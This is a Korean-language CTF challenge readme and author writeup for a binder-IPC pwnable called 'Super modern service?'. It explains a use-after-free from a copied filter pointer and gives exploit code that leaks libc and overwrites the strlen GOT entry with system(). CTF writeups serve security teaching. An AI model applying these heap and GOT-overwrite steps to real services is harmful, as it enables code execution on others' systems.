##Super modern service?

-------------------------
# team
-------------------------
ykusnwp

-------------------------
# Category / Point
-------------------------
Pwnable
50 Point

-------------------------
# Description
-------------------------
pipe를 이용한 동기 IPC에 지치셨나요?
그런 당신을 위해 준비했습니다!

-------------------------
# Hint
-------------------------
Level 1: Binder IPC Protocol.
Level 2: Dirty*4 filter structure.

-------------------------
# Setup instruction
-------------------------
Files
    readme.txt      : readme.txt입니다.
    debug/          : Debugging용 emulator입니다.
    exploit/        : Exploit code & Binary 입니다.
    release/        : 문제 배포시 사용될 emulator입니다.
    scripts/        : 문제 관련 스크립트입니다.
    server/         : 실제 Server에 올릴 emulator입니다.
    super_modern_service/ : super_modern_service code & Binary 입니다.

1. 플래그 세팅
    프로젝트 폴더를 이용해 다음 스크립트를 이용하면 server/ 의 플래그를 update 할 수 있습니다.
    ```
    $ scripts/server_set_flag.sh this_is_server_flag
    /tmp/initrd_srv found. deleting...
    Unpacked path /tmp/initrd_srv
    Packed path /mnt/hgfs/project/2019_belluminar/server/initramfs.cpio
    ```

2. 네트워크 세팅
    xinetd.d 혹은 socat을 이용해 `server/start.sh`와 I/O를 원격으로 포팅해주면 됩니다.

!!!! 주의사항 !!!!
* 매번 원격으로부터의 연결마다 `start.sh` 가 실행되어야 합니다.
  (단순히 xinetd.d, socat 사용시 바이너리의 I/O를 연결하는것처럼 연결하면 됩니다.)
* 모든 폴더를 모두 문제 서버 환경에 복사하지 말고, 플래그를 세팅 한 후, `server/` 폴더의 내용만
  복사 해주시길 바랍니다.
* 문제 배포시 사용되는 에뮬레이터 폴더는 `release/` 입니다. 압축 후 배포 부탁드립니다.
* 인터넷 연결이 선행되어야 합니다.
* curl 바이너리가 필요합니다.
  $ sudo apt get install curl -y

-------------------------
# Writeup
-------------------------
Files
    build.sh        : exploit build script 입니다.
    exploit         : exploit binary 입니다.
    includes/       : 헤더 파일들입니다.
    sources/        : 소스 파일들입니다.

본 문제의 컨셉은 binder protocol을 이용한 서비스를 exploit 해야 하는 문제입니다.
Binder protocol 구현은 `sources/binder.c`에 모두 구현이 되어 있습니다.

[취약점 설명]
취약점은 `main.c`의 `create_client()` 함수에서 발생합니다.
```
    memcpy(client, server, sizeof(*client)); /* here!!! */
    strncpy(client->name, "client", sizeof(client->name));
    memcpy(&client->client_addr, &client_addr, sizeof(client_addr));
    client->sock = sock;
    client->is_server = 0;
```
클라이언트 오브젝트를 할당하려고 할 때, 부모 오브젝트에서 모든 값을 복사 하기 때문에,
부모의 `filter` 오브젝트의 주소도 함께 복사 됩니다.

그 후에, `close_connection()` 함수를 이용해 client 오브젝트를 해제 하려고 시도하는 경우,
```
    close(conn->sock);
    if (conn->filters_head)
        filter_cleanup(conn);
```
위와 같이 부모에게서 복사된 `filter` 오브젝트도 함께 해제가 됩니다.

하지만 그 후로도 부모 오브젝트에는 dangling pointer가 남아 있기 때문에,
이를 이용한 use-after-free 공격을 시도해야 합니다.

[익스플로잇 과정 설명]
익스플로잇을 다음의 과정으로 설명 하겠습니다.

    1. Initialize
    ```
    bs = binder_open("/dev/binder", 128*1024); // [1]
    if (bs == NULL) {
        printf("error: binder_open()\n");
        goto err;
    }
    ```
    `binder_open()` 함수를 이용해 binder driver를 초기화 합니다.

    2. Server object, Filter object allocation
    ```
    create_server(0); // [1]
    create_filter(0, "1.2.3.4", "Hello, world!"); // [2]
    ```
    [1]: `create_server(0)` 함수를 통해 0번에 server object를 생성합니다.
    [2]: `create_filter(0, ...)` 함수를 통해 0번의 filter object를 생성합니다.
         IP는 "1.2.3.4", DESC는 "Hello, world!" 입니다.
         --> 이를 통해 서버에는 현재 한개의 filter object가 할당되어 있습니다.

    3. Prepare address-leak by use-after-free
    ```
    connect_server(0);
    for (i=0 ; i<10 ; i++) {
        while (client_order(0, CLIENT_STATE_CONNECT) == -1); // [1]
        if (!create_client(0, 1)) // [2]
            break;
        sleep(1);
    }
    ```
    [2]: 0번 인덱스에 클라이언트 스레드를 생성합니다.
    [2]: `create_client(0, 1)` 함수를 통해 0번 server object를 이용하여 1번 index에
         client object를 생성합니다.
         --> 이 때, 서버의 filter object를 복사함으로 use-after-free를 발생 시킬 수 있습니다.

    4. Prepare got overwrite by use-after-free
    ```
    connect_server(1);
    for (i=0 ; i<10 ; i++) {
        while (client_order(1, CLIENT_STATE_CONNECT) == -1); // [1]
        if (!create_client(0, 2)) // [2]
            break;
        sleep(1);
    }
    ```
    [1]: 1번 인덱스에 클라이언트 스레드를 생성합니다.
    [2]: `create_client(0, 1)` 함수를 통해 1번 server object를 이용하여 2번 index에
         client object를 생성합니다.
         --> 이 때, 서버의 filter object를 복사함으로 use-after-free를 발생 시킬 수 있습니다.

    5. Libc address leak
    ```
    close_connection(2); // [1]
    client_order(1, CLIENT_STATE_CLOSE); // [2]
    client_order(0, CLIENT_STATE_CLOSE); // [3]

    overwr = malloc(sizeof(*overwr));
    len = sizeof(*overwr);
    overwr->next = (struct filter *)0x6060d8; // [4]
    overwr->prev = NULL;
    overwr->addr.sin_addr.s_addr = inet_addr("1.2.3.4");
    overwr->refcount = 1;
    client_send(1, overwr, len); // [5]
    sleep(1);

    memset(buf, 0, sizeof(buf));
    filter_dump_desc(0, "0.0.0.0", buf); // [6]
    hexDump("buf", buf, sizeof(buf));
    delete_filter(1, "1.2.3.4"); [7]

    uint64_t system = *(uint64_t *)buf - 0x122ec0 + 0x4f440; // [8]
    ```
    [1]: 2번 클라이언트를 해제합니다.
         --> 이를 통해 두개의 오브젝트(0, 1)는 danglig pointer를 가지고 있습니다.
    [2]: 1번 클라이언트의 연결을 해제합니다.
    [3]: 0번 클라이언트의 연결을 해제합니다.
         클라이언트의 연결을 해제 함으로 다음과 같은 방법을 사용할 수 있습니다.
            ```
            if (!fd_is_valid(conn[idx1]->sock) || 
                client_send(conn[idx1], data, len1)) {
                logger_write("send failed.\n");
                goto err;
            }
            free(data);
            ```
            만약 `client_send()` 가 실패 할 경우, data를 메모리에서 해제하지 않습니다.
            이를 이용해 메모리를 해제하지 않은채로 붙잡을 수 있습니다.
    [4]: GOT의 주소로 `filter` 오브젝트의 `next` pointer를 변경합니다.
         --> 이를 이용해 `filter_dump_desc()` 함수로 메모리를 릭 할 수 있습니다.
    [5]: 서비스측의 힙을 overwrite 합니다.
         [2]번에서 연결을 해제하였기 때문에, [3]에서 기술한 방법으로 메모리가 할당되었습니다.
    [6]: "0.0.0.0"번 IP를 검색하여 filter의 조작된 next pointer를 가져옵니다.
    [8]: "1.2.3.4"번 IP의 filter를 해제합니다.
         --> 이를 통해 같은 사이즈를 할당함으로 위 방법을 다시 사용할 수 있습니다.
    [7]: 오프셋 계산을 통해 `system()` 함수의 주소를 알아냅니다.

    6. GOT Overwrite
    ```
    overwr = malloc(sizeof(*overwr));
    len = sizeof(*overwr);
    memset(overwr, 'A', sizeof(overwr));
    overwr->next = (struct filter *)0x606010; // [1]
    overwr->prev = NULL;
    overwr->addr.sin_addr.s_addr = inet_addr("1.2.3.4");
    overwr->refcount = 1;
    client_send(0, overwr, len);
    sleep(1);

    memset(buf, 'A', sizeof(buf));
    strcpy(buf, command); // [2]
    buf[strlen(command)]=';';
    *(uint64_t *)(buf+16) = system; // [3]
    filter_edit_desc(0, "0.0.0.0", buf); // [4]
    ```
    [1]: `filter_edit_desc()` 함수를 통해 `strlen()` 함수의 got를 덮을 수 있게 계산된 값입니다.
         이 값을 현재 filter의 next pointer로 overwrite 합니다.
    [2]: `strlen()` 함수를 `system()` 함수로 덮게 될 경우,
         ```
         strncpy(filt->desc, filter_desc, sizeof(filt->desc));
         LOG_VA("strlen(\"%s\")=%lx\n", filt->desc, strlen(filt->desc));
         ```
         위와 같이 `filter_edit_desc()` 함수가 끝난 후 원하는 문자열을 인자로,
         `system()`을 실행 시킬 수 있습니다.
         그래서 filter_edit_desc의 세번째 인자로 들어가는 문자열을 통해,
         GOT Overwrite도 수행하고, 인자도 줘야 함으로, ';'을 넣어 줬습니다.
    [3]: `strlen()` 함수를 `system(0)` 함수로 덮습니다.
    [4]: 위의 내용을 트리거합니다.

위의 익스플로잇 코드와 과정을 이용하면, /tmp/f 에 gzip과 base64로 압축된 플래그가 복사됩니다.
이를 읽어서 문제를 해결 할 수 있습니다.